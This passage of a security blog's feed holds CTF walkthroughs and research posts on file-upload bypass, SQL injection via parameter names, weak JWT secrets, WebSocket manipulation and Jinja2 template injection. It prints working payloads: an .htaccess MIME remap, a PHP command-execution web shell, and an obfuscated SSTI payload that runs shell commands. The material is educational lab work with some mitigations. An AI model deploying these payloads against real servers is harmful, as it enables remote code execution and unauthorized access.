    <p><strong>Purpose:</strong> They are commonly used for tasks such as URL rewriting (<code class="language-plaintext highlighter-rouge">mod_rewrite</code>), custom error pages, restricting access (access control), and, in this case, <strong>defining how files are handled</strong> (MIME types).</p>
  </li>
</ul>

<ol>
  <li>The Exploit: MIME Type Re-Mapping with <code class="language-plaintext highlighter-rouge">AddType</code></li>
</ol>

<p>The exploit hinges on the fact that when Apache receives a request for a file, it uses the file’s extension (or other configuration) to determine its <strong>MIME type</strong>, which tells the server and the browser what kind of content it is (e.g., <code class="language-plaintext highlighter-rouge">image/jpeg</code>, <code class="language-plaintext highlighter-rouge">text/html</code>).</p>

<p>The Directive:</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
AddType application/x-httpd-php .backdoor
</code></pre>
  
</div>

<table>
  <thead>
    <tr>
      <th><strong>Directive Component</strong></th>
      <th><strong>Explanation</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">AddType</code></strong></td>
      <td>This is the Apache directive that maps a given <strong>MIME type</strong> to a specific <strong>file extension</strong>.</td>
    </tr>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">application/x-httpd-php</code></strong></td>
      <td>This is the MIME type used by Apache to tell the server: “This content should be processed by the PHP interpreter.”</td>
    </tr>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">.backdoor</code></strong></td>
      <td>This is the arbitrary file extension you chose.</td>
    </tr>
  </tbody>
</table>

<p>Now let’s follow those steps:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MV03DXFezf8QtAxLjcp67A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <span class="code-lang-tag">Request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Request">
------geckoformboundary58b7d552bbae2dc3d17de786c141d311
Content-Disposition: form-data; name="image"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .backdoor
------geckoformboundary58b7d552bbae2dc3d17de786c141d311--
</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Response</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Response">
Successfully uploaded!<br />Access it at: &lt;a href='images/.htaccess'&gt;images/.htaccess&lt;/a&gt;
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*VWYzK6ALthrn4hfOhVfiUA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <span class="code-lang-tag">Request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Request">
------geckoformboundary58b7d552bbae2dc3d17de786c141d311
Content-Disposition: form-data; name="image"; filename="backdoor1.backdoor"
Content-Type: application/x-httpd-php

&lt;?php if(isset($_REQUEST['cmd'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;

------geckoformboundary58b7d552bbae2dc3d17de786c141d311--
</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Response</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Response">
Successfully uploaded!<br />Access it at: &lt;a href='images/backdoor1.backdoor'&gt;images/backdoor1.backdoor&lt;/a&gt;
</code></pre>
  
</div>

<p>WHOAMI</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bUN1ITdh79ZBF3cZDBV-MQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>A university’s online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded, but are they enough? Take a look at how the upload is implemented. Maybe there’s a way to slip past the checks and interact with the server in ways you shouldn’t.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DJEtBw2KoP102M_U7q9MWQ.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DJEtBw2KoP102M_U7q9MWQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">When Input Becomes Injection</title><link href="/blog/Input-sql-Injection" rel="alternate" type="text/html" title="When Input Becomes Injection" /><published>2025-10-18T00:00:00-04:00</published><updated>2025-10-18T00:00:00-04:00</updated><id>http://localhost:4000/blog/SQLI-User-Input</id><content type="html" xml:base="/blog/Input-sql-Injection"><![CDATA[<p>Developers should never trust user input. Even when you think you’ve sanitized everything and even when you’re using the familiar ? placeholder in Node.js MySQL libraries mistakes and wrong assumptions can still leave your app vulnerable.</p>

<p>A few essential points:</p>
<ul>
  <li>? placeholders protect values, not SQL structure. They safely substitute data values, but they do not and cannot be used for identifiers, SQL keywords, or fragments you build by string concatenation. If you concatenate table names, column names, ORDER BY clauses, or entire SQL snippets with user input, a placeholder won’t help.</li>
  <li>Misusing escaping, trusting client-side validation, or doing shallow sanitization (like stripping a few characters) can be bypassed. There are second‑order injections (stored malicious input executed later), encoding tricks, and edge cases with JSON and binary data.</li>
  <li>The typical Node.js + MySQL pitfalls: building queries with template strings, using unvalidated inputs for identifiers, relying on naive input filters, or assuming middleware has already made the input safe.</li>
</ul>

<h1 id="endpoints">Endpoints</h1>

<ul>
  <li>api/v1/users/filter?name=</li>
  <li>api/v1/blogs/filter</li>
  <li>api/v1/blogs/filter?author=</li>
</ul>

<h1 id="walkthrough">Walkthrough</h1>

<p>We are logged in as Alice.</p>

<p>If we visit this endpoint <code class="language-plaintext highlighter-rouge">api/v1/blogs/filter</code>:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*uM1aaR5nAaYZVRDaDdoO4g.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we use something like <code class="language-plaintext highlighter-rouge">api/v1/blogs/filter?author=</code> from any author for example <code class="language-plaintext highlighter-rouge">Alice</code> or <code class="language-plaintext highlighter-rouge">Bob</code> we make a request like:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MTciSW3EYcb9t_Kz8uEpxg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*6gX220WzN39JzKvsAged5A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>But let’s say we have another endpoint <code class="language-plaintext highlighter-rouge">api/v1/users/filter?name=</code>. Remember we are logged in as Alice, so our request would be:</p>

<p><code class="language-plaintext highlighter-rouge">api/v1/users/filter?name=Alice</code> as shown below</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MPqXu-D6n5xzQN-LDPvVYg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Our SQL request would look like this :</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*poI5wofBAtxklzkFPFRa4Q.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>What if we try to access Bob’s information?</p>

<p>We can’t, we get <code class="language-plaintext highlighter-rouge">Unauthorized</code>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*5cFnvj_tbv2uiM9Bi6qj8A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>What if we change the <code class="language-plaintext highlighter-rouge">name</code> parameter to something different, for example: <code class="language-plaintext highlighter-rouge">api/v1/users/filter?foo=bar</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Aie8ldbkzioHPkWkdupF7A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Server running on port 3000
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
Built users query: SELECT * FROM users WHERE foo=? Data: [ 'bar' ]
</code></pre>
  
</div>

<p>We were able to modify the query as you can see above. That means there is a potential for SQL injection for example, to make a condition always true one common payload is <code class="language-plaintext highlighter-rouge">OR 1=1</code>. First, let’s explore more: what if we sent something like <code class="language-plaintext highlighter-rouge">api/v1/users/filter?name%20bar=bar</code></p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Server running on port 3000
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
Built users query: SELECT * FROM users WHERE foo=? Data: [ 'bar' ]
Built users query: SELECT * FROM users WHERE name bar=? Data: [ 'bar' ]
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*QiCtNtqdXA8qWK9EOhSWFg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>We fully controlled the query, which means if we sent something like <code class="language-plaintext highlighter-rouge">OR 1=1</code> it could return true and dump information:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Server running on port 3000
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
Built users query: SELECT * FROM users WHERE foo=? Data: [ 'bar' ]
Built users query: SELECT * FROM users WHERE name bar=? Data: [ 'bar' ]
Built users query: SELECT * FROM users WHERE name OR 1=? Data: [ '1' ]
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*2VBZH3qBIWy84CnSYSCZ2A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9_j_ru2wAij9w4kqY5obwQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h1 id="quick-mitigations-and-takeaways">Quick mitigations and takeaways</h1>

<ul>
  <li>Always use parameterized queries / prepared statements for data values.</li>
  <li>Never inject user input into SQL structure (identifiers, keywords, clause fragments). If you must vary structure, use strict whitelists or server-side mappings.</li>
  <li>Validate and coerce types server-side (numbers, enums, ranges) instead of relying on shallow string sanitization or client-side checks.</li>
  <li>Apply least privilege for database accounts and avoid exposing powerful permissions to the application user.</li>
  <li>Log unexpected input and monitor query patterns to detect abuse or probing.</li>
  <li>Defense in depth: input validation, prepared statements, minimal DB permissions, and runtime monitoring.</li>
</ul>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>Developers should never trust user input. Even when you think you’ve sanitized everything and even when you’re using the familiar ? placeholder in Node.js MySQL libraries mistakes and wrong assumptions can still leave your app vulnerable.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dU101LJckdGykTOw0K0q6w.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dU101LJckdGykTOw0K0q6w.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Weak JWT Secrets: How ‘secret’ Breaks Your Auth</title><link href="/blog/Weak-JWT-Secret" rel="alternate" type="text/html" title="Weak JWT Secrets: How ‘secret’ Breaks Your Auth" /><published>2025-10-16T00:00:00-04:00</published><updated>2025-10-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/JWT-Weak-JWT-Signing-Key</id><content type="html" xml:base="/blog/Weak-JWT-Secret"><![CDATA[<p>This post begins a short series about authentication mistakes I often see in Node.js/Express applications. We’ll look at a real-but-safe example where the server uses JSON Web Tokens (JWTs) for authentication, but the signing secret is weak and guessable. That weakness lets an attacker forge tokens that the server accepts.</p>

<p>The goal here is educational: to show how this class of bug appears in an Express app, I will not publish exploit scripts or wordlists; instead, this walkthrough focuses on how to find the problem.</p>

<p>Summary of the vulnerable setup:</p>

<ul>
  <li>A Node.js server built with Express issues JWTs using the HS256 algorithm.</li>
  <li>The server stores the signing key as a short or common string (for example, “secret”, “1234”, or an English word).</li>
  <li>Because the secret is weak, an attacker who can guess it can sign arbitrary tokens (for example, upgrading their user to admin) and the server will accept them.</li>
</ul>

<p>What you’ll learn in this post:</p>

<ul>
  <li>How to spot weak JWT secrets in code and runtime configuration.</li>
</ul>

<p>If you want to follow along locally, create a tiny Express app and never expose test secrets to the public internet. Treat any reproduction data as lab-only, and rotate secrets after testing.</p>

<h1 id="endpoints">Endpoints</h1>

<ul>
  <li>/login</li>
  <li>/admin</li>
</ul>

<h1 id="walkthrough">Walkthrough</h1>

<p>We have these credentials:</p>

<div class="code-block-container">
  <span class="code-lang-tag">Node.js</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
const users = [
  { id: 1, username: 'alice', password: 'alicepw', role: 'user' },
  { id: 2, username: 'bob', password: 'bobpw', role: 'admin' }
];
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*W4uuTeSh19BpKiXWpCM_Og.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we try to access <code class="language-plaintext highlighter-rouge">/admin</code>, we get something like:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKgINRctNUElgqcrlkViTA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we use this site: <a href="https://supertokens.com/jwt-encoder-decoder">SuperTokens JWT Decoder</a>, we can decode the JWT.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FHA3j2RQVeeSkmI5sH22Mg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we change the role from user to admin to see if we can access the <code class="language-plaintext highlighter-rouge">/login</code> endpoint, we get this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dyZ7ji7c73Rk1S5gVAI4sA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dhE9RAXWpHqDFCoAUpGNrw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h1 id="brute-force">Brute-Force</h1>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*THD_HPjG4eXnFeSA2U0QFQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Let’s use hashcat to brute-force the JWT</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*7TpkpAfBwrmQed_Sz3jXzQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><code class="language-plaintext highlighter-rouge">secret</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*3gMgc6GAOQVJR_JQN7BDYQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h1 id="welcome-admin-alice">Welcome, admin Alice</h1>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8I9piVg6oNt1BxnCWZaQKA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>This post begins a short series about authentication mistakes I often see in Node.js/Express applications. We’ll look at a real-but-safe example where the server uses JSON Web Tokens (JWTs) for authentication, but the signing secret is weak and guessable. That weakness lets an attacker forge tokens that the server accepts.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*xmO_zJP7qmtGWLiHtdeRIQ.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*xmO_zJP7qmtGWLiHtdeRIQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">WebSockFish PicoCTF</title><link href="/blog/WebSockFishPicoCtf" rel="alternate" type="text/html" title="WebSockFish PicoCTF" /><published>2025-09-16T00:00:00-04:00</published><updated>2025-09-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/WebSockFish-picoctf</id><content type="html" xml:base="/blog/WebSockFishPicoCtf"><![CDATA[<p>When we accessed the website, we found this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*4KmVEKucoc6ZP5RrNqeDOw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>It appears to be a normal chess game.</p>

<p>Even though I don’t know much about how to play this game, I’m going to make some random moves</p>

<p>Once I make the first move, in Burp Suite WebSocket history, we can see two requests made by me (the client) and the fish (the server).</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*lgl1MJRvjRj3WBEoA1LGpQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>I’m going to keep making more random moves until the fish wins, to see the whole process.</p>

<p>After a few random moves, instead of sending <code class="language-plaintext highlighter-rouge">eval [number]</code>, it sent ‘mate 3’ to the server.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*U0wL9yrqL7C3AfilUWAs6A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>When I make more random moves, I reach the point where I can’t move anymore, and my last message to the server is ‘mate 1’.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*PraZf_AfyGn5PuJ9t1LrvQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now it’s time to make a move using Repeater to see what we can do with it.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*ZyjWuYiSPuFCxrAMm0UmRw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Let’s send <code class="language-plaintext highlighter-rouge">mate 1</code>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*NdMMzI5nh0JfetVQXRAShQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Nothing. What if we go below 0?</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*mq7LaTHx8LBODx2XXxSEhA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Interesting, we checkmated. We win?? But there’s no flag?</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*v1GYh32UR5xxB9zjmn92zg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Nothing. Let’s change it to <code class="language-plaintext highlighter-rouge">eval -9999</code> first, and then we can keep pushing forward.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*0xi8bsLqVYhDFF-wz3ynBQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>By adding another 9 to <code class="language-plaintext highlighter-rouge">eval -9999</code>, we got the flag.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*1HxCbmb-J_EmKFWqvyTk0Q.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>When we accessed the website, we found this:</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*uKuKNFiZss4ahdQvweK_Jw.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*uKuKNFiZss4ahdQvweK_Jw.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SSTI2 PicoCTF</title><link href="/blog/SSTI2PicoCTF" rel="alternate" type="text/html" title="SSTI2 PicoCTF" /><published>2025-09-16T00:00:00-04:00</published><updated>2025-09-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/SST2-picoctf</id><content type="html" xml:base="/blog/SSTI2PicoCTF"><![CDATA[<p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)</p>

<p>This is going to be challenging, but we’ve got this because, based on the description…</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/0*pH3T71KSqmj2LUip" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Using this image, we can test the site to see which templates we are working on.</p>

<p>from <code class="language-plaintext highlighter-rouge">${7 * 7}</code> didn’t work, <code class="language-plaintext highlighter-rouge">{{7 * 7}}</code> works -&gt; <code class="language-plaintext highlighter-rouge">{{7*’7'}}</code> works —&gt; jinja2 or twig</p>

<p>Based on this post, we have different payloads to be able to bypass this with Jinja2 <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('whoami')|attr('read')()}}
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dPHJA_Rrnb9ORHvdFGlKbg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*d2R1OXU4u4xLDzO7teA1eA.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*d2R1OXU4u4xLDzO7teA1eA.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>